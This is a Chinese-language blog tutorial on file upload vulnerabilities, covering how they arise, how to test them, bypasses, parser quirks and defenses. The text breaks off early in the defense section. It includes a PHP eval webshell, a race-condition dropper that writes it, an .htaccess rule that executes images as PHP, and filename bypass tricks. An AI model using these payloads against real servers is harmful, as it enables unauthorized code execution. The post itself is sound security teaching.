@@ -1,0 +1,497 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>文件上传漏洞详解——原理、测试、绕过与防御 | just.ok的个人博客</title><meta name="author" content="just.ok"><meta name="copyright" content="just.ok"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="头像上传接口，直接传 shell.php，返回「仅支持 jpg&#x2F;png 格式」。Burp Repeater 里把 multipart 表单中自报的 MIME 从 application&#x2F;octet-stream 改成 image&#x2F;png，文件名不动： 12345------xContent-Disposition: form-data; name&#x3D;&quot;file&quot;; filenam">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞详解——原理、测试、绕过与防御">
+<meta property="og:url" content="http://blog.just-ok.xyz/posts/781eab3a/index.html">
+<meta property="og:site_name" content="just.ok的个人博客">
+<meta property="og:description" content="头像上传接口，直接传 shell.php，返回「仅支持 jpg&#x2F;png 格式」。Burp Repeater 里把 multipart 表单中自报的 MIME 从 application&#x2F;octet-stream 改成 image&#x2F;png，文件名不动： 12345------xContent-Disposition: form-data; name&#x3D;&quot;file&quot;; filenam">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6909bfa63203f7be00cf70c4.jpg">
+<meta property="article:published_time" content="2026-10-30T03:50:00.000Z">
+<meta property="article:modified_time" content="2026-10-30T10:48:34.795Z">
+<meta property="article:author" content="just.ok">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="中间件">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/6909bfa63203f7be00cf70c4.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "文件上传漏洞详解——原理、测试、绕过与防御",
+  "url": "http://blog.just-ok.xyz/posts/781eab3a/",
+  "image": "https://pic1.imgdb.cn/item/6909bfa63203f7be00cf70c4.jpg",
+  "datePublished": "2026-10-30T03:50:00.000Z",
+  "dateModified": "2026-10-30T10:48:34.795Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "just.ok",
+      "url": "http://blog.just-ok.xyz"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://pic1.imgdb.cn/item/67d9824088c538a9b5c04e68.jpg"><link rel="canonical" href="http://blog.just-ok.xyz/posts/781eab3a/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":150,"languages":{"author":"作者: just.ok","link":"链接: ","source":"来源: just.ok的个人博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '文件上传漏洞详解——原理、测试、绕过与防御',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/daliyuer.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="/css/categorybar.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://pic1.imgdb.cn/item/67d9821888c538a9b5c04e57.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">81</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://c6.y.qq.com/base/fcgi-bin/u?__=cNJOP3d6JHix"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://pic1.imgdb.cn/item/6909bfa63203f7be00cf70c4.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">just.ok的个人博客</span></a><a class="nav-page-title" href="/"><span class="site-name">文件上传漏洞详解——原理、测试、绕过与防御</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://c6.y.qq.com/base/fcgi-bin/u?__=cNJOP3d6JHix"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">文件上传漏洞详解——原理、测试、绕过与防御</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-10-30T03:50:00.000Z" title="发表于 2026-10-30 11:50:00">2026-10-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-10-30T10:48:34.795Z" title="更新于 2026-10-30 18:48:34">2026-10-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>头像上传接口，直接传 <code>shell.php</code>，返回「仅支持 jpg/png 格式」。Burp Repeater 里把 multipart 表单中自报的 MIME 从 application/octet-stream 改成 <code>image/png</code>，文件名不动：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------x</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_REQUEST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>返回上传成功，路径 <code>/uploads/shell.php</code>。浏览器访问，脚本直接执行。服务端校验的是 multipart 里自报的 MIME 类型，这个字段完全由客户端控制——只看它的校验等于没有校验。</p>
+<p>同类的站还会拦后缀。把文件名改成 <code>shell.jpg</code>、内容换成 PHP 代码，后缀校验放行，存进去的仍是一段服务器可解析的代码——只要上传目录有执行权限，这就是一个 RCE。</p>
+<p>文件上传的问题从来不止「传没传上去」：真正要问的是<strong>文件被存成了什么、会不会被当资源执行</strong>。<a target="_blank" rel="noopener" href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">OWASP Unrestricted File Upload</a> 把这类问题的危害整理成完整清单：代码执行、客户端攻击（XSS）、文件系统或数据库过载、向后端转发攻击、页面篡改，评级时可以对照。</p>
+<h2 id="漏洞原理：存进去，还要被执行"><a href="#漏洞原理：存进去，还要被执行" class="headerlink" title="漏洞原理：存进去，还要被执行"></a>漏洞原理：存进去，还要被执行</h2><p>漏洞成立需要两条同时满足：</p>
+<ol>
+<li><strong>恶意内容能落盘</strong>——类型、后缀、内容三层校验至少一层可绕过</li>
+<li><strong>落盘的文件会被解析执行</strong>——存储目录有执行权限、后缀被中间件绑定到脚本 handler，或站点存在文件包含点</li>
+</ol>
+<p>第 1 条决定能不能传上去，第 2 条决定传上去有没有用。二者攻击面完全不同：前者攻应用代码的校验逻辑，后者攻部署配置与架构。不少测试卡在第一条打通后没有下文，通常就是第 2 条不成立——目录不给执行权限，或文件被转存到对象存储，这时要转向组合链而不是继续调 payload。</p>
+<p>PHP 的上传处理集中在 <code>$_FILES</code> 超全局数组与 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.move-uploaded-file.php">move_uploaded_file</a>：前者接收文件名、MIME、大小、临时路径，后者把临时文件移动到指定位置。一个值得记的实现细节：目标文件已存在会被<strong>直接覆盖</strong>。</p>
+<p>校验逻辑几乎都写在「移动到哪里」这一步，漏洞也集中在这——路径参数受 <code>open_basedir</code> 约束的只有目标一侧，源路径不受限，而路径末尾的特殊写法、数组形态的参数都会改变校验与落盘的对应关系，后面几节的多个手法正源于此。</p>
+<p>服务端校验按实现层次分五类，测试与绕过都围绕这个分层展开：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>层</th>
+<th>校验内容</th>
+<th>常见实现</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>前端 JS</td>
+<td>后缀、大小</td>
+<td>表单事件里正则匹配</td>
+</tr>
+<tr>
+<td>HTTP 层</td>
+<td>MIME 类型</td>
+<td>读 <code>$_FILES[&#39;type&#39;]</code></td>
+</tr>
+<tr>
+<td>文件名层</td>
+<td>后缀黑白名单</td>
+<td><code>pathinfo</code> 取后缀 + 数组比对</td>
+</tr>
+<tr>
+<td>内容层</td>
+<td>文件头、图像合法性</td>
+<td><code>getimagesize</code>、GD 重采样</td>
+</tr>
+<tr>
+<td>架构层</td>
+<td>存储与执行分离</td>
+<td>目录禁执行、独立存储域名、OSS</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="测试流程：先定位校验在哪一层"><a href="#测试流程：先定位校验在哪一层" class="headerlink" title="测试流程：先定位校验在哪一层"></a>测试流程：先定位校验在哪一层</h2><p>黑盒测试四步，顺序不能反：</p>
+<ol>
+<li><strong>基线</strong>——传一个正常图片，记录成功响应、文件返回的 URL 与命名规律（是否保留原名、是否加随机前缀）</li>
+<li><strong>改后缀</strong>——同一请求把 <code>filename</code> 改为 <code>shell.php</code> 重放。数据包还没发出浏览器就提示类型错误，是前端校验；请求正常发出、响应里报类型错误，是服务端校验</li>
+<li><strong>改 MIME</strong>——后缀拦了就单独改 <code>Content-Type</code> 为 <code>image/gif</code>，定位校验是否只看 MIME</li>
+<li><strong>改内容</strong>——MIME 也过了就换文件头，逐层下探到内容校验</li>
+</ol>
+<div class="note green icon-padding flat"><i class="note-icon far fa-bell"></i><p>前端拦截永远可以绕——禁用 JS 或直接改包即过，它拦的是普通用户，不是测试者。判断它的价值只在于排除一层干扰，省下后面几次无效重放。</p>
+</div>
+<p>每一步都在缩小「校验在哪」的范围。定位之后剩下的事按层展开：文件名层攻校验实现，内容层攻图片处理链，架构层的坑落在配置里。</p>
+<h2 id="后缀与类型校验的绕过"><a href="#后缀与类型校验的绕过" class="headerlink" title="后缀与类型校验的绕过"></a>后缀与类型校验的绕过</h2><p>绕过方向由校验实现决定，三条主线：换后缀、换写法、改路径归属。</p>
+<p><strong>黑名单类校验，攻覆盖面。</strong> 黑名单列不全、比较不严、替换不彻底都算覆盖面问题：</p>
+<ul>
+<li><strong>大小写混写</strong>——<code>shell.pHp</code>，部分实现用不区分大小写的正则拦、却拿原串落盘</li>
+<li><strong>替换只跑一次</strong>——删除关键字的代码只执行一轮替换，提交 pphphp，删完后恰好剩 php。测法是看落盘的文件名：提交 <code>1.pphphp</code> 存成 <code>1.php</code> 即命中</li>
+<li><strong>名单漏项</strong>——PHP 除 .php 外还有 .php3、.php5、.phtml、.pht、.phar 等后缀，是否被解析取决于中间件映射：Debian 系发行版默认只认 .php、.phar、.phtml，其余需额外 AddHandler；IIS 6 默认把 .asa、.cer、.cdx 映射到 asp.dll，IIS 7 起默认只剩 .asp 与 .cer。测试时按目标环境的 handler 映射确认。<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files">PayloadsAllTheThings 的 Upload Insecure Files</a> 按 PHP/ASP/JSP 分语言列了默认可执行后缀全集，测黑名单时对着它跑字典</li>
+<li><strong>路径归一化</strong>——黑名单只判扩展名是否在列表里，保存名提交 <code>shell.php/.</code> 时 pathinfo 取到的扩展名为空、不在列表，放行；Windows 落盘时末尾的 /. 被归一化掉，文件写成 shell.php。同一原理的变体是末尾带点与末尾带空格的写法</li>
+</ul>
+<p><strong>白名单类校验，攻比较逻辑本身。</strong> 白名单封住了后缀面，突破口转向「拿什么参与比较、拿什么落盘」：</p>
+<ul>
+<li><strong><code>%00</code> 截断</strong>——文件名里插一个真实的 0x00 字节再接 .jpg（multipart 的 filename 里打百分号形式的 %00 不会被解码成空字节，要用 Burp 的十六进制编辑插入）。比较发生在 PHP 层、二进制安全，取到 .jpg 过白名单；落盘发生在 C 层、遇空字节截断，写成 shell.php。老版本 PHP 的路径函数接受路径中的空字节：fopen、include 等的空字节检查自 PHP 5.3.4 引入（<a target="_blank" rel="noopener" href="https://www.php.net/ChangeLog-5.php">CVE-2006-7243</a>），而 move_uploaded_file 的同类保护 2015 年才补齐（CVE-2015-2348，PHP 5.6.7 修复）——同一手法在不同函数上的存活版本区间并不一致，遇到老系统值得分开测</li>
+<li><p><strong>数组参数</strong>——保存名参数提交成数组，比较与拼接用了不同的下标。<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">upload-labs</a> 最后一关的源码里，白名单用 <code>end()</code> 取最后一项校验，落盘名却用 <code>reset($file) . &#39;.&#39; . $file[count($file) - 1]</code> 拼接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">save_name[0] = shell.php</span><br><span class="line">save_name[2] = gif</span><br></pre></td></tr></table></figure>
+<p>end() 取到 gif 过白名单，落盘名却按数组最后一项的下标拼接，指向不存在的 [1]——拼出末尾带点的 shell.php.，Windows 归一化后落成 shell.php。校验和落盘用了两套取值逻辑，是这类问题的共同特征</p>
+</li>
+</ul>
+<p><strong>配置文件当目标。</strong> Apache 启用 AllowOverride 时，<code>.htaccess</code> 本身就是可上传目标——上传一行 <code>AddType application/x-httpd-php .png</code>，此后目录里所有 png 都按 PHP 执行，后缀校验从此形同虚设。IIS 的对应目标是 web.config，uWSGI 是 uwsgi.ini（其 @() 语法可直接执行命令）。这类手法不绕校验，直接改写解析规则。</p>
+<details class="toggle" style="border: 1px solid #448aff1a"><summary class="toggle-button" style="background-color: #448aff1a;">Windows 系统特性补充</summary><div class="toggle-content"><p>Windows 对文件名末尾字符的处理是多个绕过的根源：</p>
+<ul>
+<li><code>move_uploaded_file</code> 与 <code>fopen</code> 遇到 <code>foo.php</code> 后跟 <code>\x2E</code>（.）、<code>\x2F</code>（/）、<code>\x5C</code>（\）的组合，会归一化回 <code>foo.php</code></li>
+<li><code>include</code>/<code>require</code> 容忍的是另一组尾部字符：<code>\x20</code>（空格）、<code>\x22</code>（”）、<code>\x2E</code>（.）、<code>\x3C</code>（&lt;）、<code>\x3E</code>（&gt;）——文件包含绕过后缀限制时用这组</li>
+<li>末尾空格与点在创建文件时被系统去除</li>
+<li>NTFS 交替数据流：<code>shell.php::$DATA</code> 落盘为 <code>shell.php</code> 主流；<code>file.asax:.jpg</code> 先创建空文件，再借短文件名改写内容</li>
+<li>PHP on IIS 保存文件时 <code>&gt;</code> 与 <code>&lt;</code> 会分别被转成 <code>?</code> 与 <code>*</code>，<code>web&lt;&lt;</code> 可顶替 <code>web.config</code></li>
+</ul>
+<p>来源：<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files">PayloadsAllTheThings Upload Tricks</a>，其中 IIS 字符转换出自 Soroush Dalili 的研究。</p>
+</div></details>
+<h2 id="内容校验与执行条件"><a href="#内容校验与执行条件" class="headerlink" title="内容校验与执行条件"></a>内容校验与执行条件</h2><p>内容层校验看的是文件本体，绕过思路从「伪装成图片」到「真的当图片」递进。</p>
+<p><strong>文件头伪装。</strong> getimagesize 一类函数只读头部字节，文件开头加上 <code>GIF89a</code>（或 JPEG 的 \xff\xd8\xff 起始字节），后面跟 PHP 代码，即通过校验——存成的文件是「带 PHP 代码的图片」，要执行还需解析或包含配合。</p>
+<p><strong>二次渲染对抗。</strong> 用 GD 库重采样后再存储（上传头像最常见），图片数据被重新编码，简单嵌在正文的代码会被抹掉。对抗方式是先上传正常图片、下载渲染后的成品、对比出未被重写的区域（如 PNG 的 PLTE 块、JPG 的注释段），把代码塞进保留区再传。构造这类文件用现成脚本：<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Compression">PayloadsAllTheThings 的 Picture Compression 目录</a>里放着能在 JPEG 重压缩后存活的 payload 图生成器（<code>createBulletproofJPG.py</code> 等）。二次渲染的文件同样要靠文件包含执行。</p>
+<p><strong>图片马 + 包含链。</strong> 上面两条产出的图片马本身不执行，常见的执行通道是站点自身的文件包含点（<code>include($_GET[&#39;file&#39;])</code>）。上传与包含两个弱点单独看都是低危，组合成链就是 RCE——这也是上传漏洞评级时必须查包含点的原因。</p>
+<p><strong>条件竞争。</strong> 校验逻辑是「先落盘、再检查后缀、不合格就删除」时，落盘到删除之间存在窗口。上传侧用 <code>Burp Intruder</code> 不间断重放上传包，访问侧同时高频请求猜测的文件路径，任一次请求落在窗口内即写入稳定 webshell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;x.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上传线程：POST /upload  ×  N</span><br><span class="line">访问线程：GET  /uploads/&lt;可预测路径&gt;  ×  M</span><br></pre></td></tr></table></figure>
+<p>文件名可预测是前提——保留原名或时间戳命名的场景才有竞争窗口，随机重命名直接封死这类利用。</p>
+<p><strong>文件名本身是输入。</strong> 后缀之外，原始文件名经常原样进数据库或页面：进 SQL 语句是注入点，回显在文件列表是存储型 XSS，拼进下载路径是路径穿越。测试时把文件名换成对应 payload，落点在上传记录页、日志页、后台审核页的尤其值得看。SVG 与 HTML 文件上传后能直链访问的，等于站内可执行 JS，利用面见<a href="/posts/2813c695/">XSS 漏洞详解——原理、类型、测试与绕过</a>。</p>
+<h2 id="中间件与解析漏洞"><a href="#中间件与解析漏洞" class="headerlink" title="中间件与解析漏洞"></a>中间件与解析漏洞</h2><p>应用代码校验无懈可击，中间件配置照样能送出执行权。三个经典场景：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>中间件</th>
+<th>触发配置</th>
+<th>形态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Apache</td>
+<td><code>AddHandler application/x-httpd-php .php</code></td>
+<td><code>shell.php.abc</code> 中段含 <code>.php</code> 即被绑定 PHP handler</td>
+</tr>
+<tr>
+<td>Nginx + FPM</td>
+<td><code>cgi.fix_pathinfo=1</code> 且未启用 FPM 限制</td>
+<td><code>/shell.jpg/.php</code> 回退解析成 <code>shell.jpg</code> 执行</td>
+</tr>
+<tr>
+<td>IIS 6</td>
+<td>默认</td>
+<td><code>shell.asp;.jpg</code> 分号截断；<code>*.asp</code> 目录内任意后缀按 ASP 执行</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><strong>Apache 的多扩展名机制</strong>是第一种场景的根源。<a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/mod/mod_mime.html">mod_mime 官方文档</a>写明：多扩展名文件中最右侧扩展名决定 media type，但 <strong>handler 优先于 media type</strong>——配置用 Add* 指令绑定 PHP 时，文件名中段出现 .php 就足以绑定 handler。官方同时给出修复方向：用 <code>&lt;FilesMatch &quot;\.php$&quot;&gt;</code> 配 SetHandler，并明确「依赖这类合成类型的配置应当避免」。测试时传一个 shell.php.abc，访问后返回 200 且执行即命中。</p>
+<p><strong>Nginx 的场景在 FPM 侧。</strong> Nginx 自身不解析 PHP，/shell.jpg/.php 这类路径被原样交给 FastCGI 后，PHP-FPM 在 <code>cgi.fix_pathinfo=1</code>（历史默认值）时把不存在的脚本回退解析成 shell.jpg 执行。官方在 FPM 池配置里提供了兜底项 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/install.fpm.configuration.php">security.limit_extensions</a>：限制 FPM 允许解析的主脚本扩展名，当前默认 .php 与 .phar——这条链成立的前提是该值被<strong>显式置空</strong>（置空才允许全部扩展名），或运行在 5.3.9 之前还没有该指令的 FPM 上，默认配置下 /shell.jpg/.php 会被 FPM 拒绝。<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">vulhub</a> 上有这套配置的现成复现环境。</p>
+<details class="toggle" style="border: 1px solid #448aff1a"><summary class="toggle-button" style="background-color: #448aff1a;">CMS 与第三方编辑器</summary><div class="toggle-content"><ul>
+<li><strong>第三方编辑器</strong>——UEditor、KindEditor 等自带的上传接口独立于业务代码，UEditor .NET 版的远程抓图接口（<code>controller.ashx</code>）曾长期存在任意文件上传，只需要能访问 <code>controller.ashx</code> 且未做鉴权</li>
+<li><strong>已知 CMS</strong>——通达 OA v11.x 的上传利用链（任意文件上传与文件包含组合）、各类建站系统的主题/插件上传点；vulhub 有 Apache/Nginx 解析漏洞与 PHP 包含环境的现成复现（<code>httpd/apache_parsing_vulnerability</code>、<code>php/inclusion</code>），通达 OA 这类 CMS 需自备安装包</li>
+<li><strong>判别思路</strong>——页面引用了编辑器资源目录（<code>/ueditor/</code>、<code>/kindeditor/</code>）或指纹识别出 CMS，先查对应版本已公开的上传漏洞再手工测，效率高于黑盒</li>
+</ul>
+</div></details>
+<h2 id="危害评估与边界"><a href="#危害评估与边界" class="headerlink" title="危害评估与边界"></a>危害评估与边界</h2><p>「传上去了」不等于 RCE。评估一个上传点，按三问定级：<strong>存到哪、能否直接访问、会不会被解析</strong>。</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>危害</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>直链可访问且后缀被解析</td>
+<td>严重</td>
+<td>直接 RCE</td>
+</tr>
+<tr>
+<td>SVG/HTML 直链同源可访问</td>
+<td>高</td>
+<td>存储型 XSS，打后台价值最高</td>
+</tr>
+<tr>
+<td>仅存储，目录无执行权限</td>
+<td>低</td>
+<td>文件是死的，需组合链利用</td>
+</tr>
+<tr>
+<td>文件名进数据库或页面</td>
+<td>视落点</td>
+<td>SQL 注入、XSS，单独评级</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>架构层的存储方案直接掐断执行链：文件转存到独立域名（上传走 <code>upload.</code>、访问走 <code>images.</code>）或 OSS 对象存储后，上传目录下没有脚本执行的概念，第 2 条成立条件不存在。这类目标上传点的期望值应下调为「存储型利用」——XSS、文件名注入、或寻找下载/包含侧的二次漏洞。</p>
+<div class="note warning flat"><p>条件竞争与后缀字典爆破在真实目标上的代价很直接：高频请求触发 WAF 告警、IP 封禁，上传行为在日志中全部留痕，后续测试同步受影响。竞争窗口类手法只在确认靶场或授权目标的场景使用。</p>
+</div>
+<div class="note danger flat"><p>测试写入的 webshell 与图片马是持久化痕迹，测试结束前全部删除并记录清单——它们留在服务器上既是审计问题，也可能被第三方扫描利用。</p>
+</div>
+<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><p><strong>第一层，白名单 + 服务端重命名。</strong> 后缀白名单比对放在服务端，比较与落盘用同一份值（数组绕过的教训）；落盘名随机生成、扩展名由白名单映射，原始文件名只作展示用——这一条同时封掉条件竞争、路径归一化与文件名注入。</p>
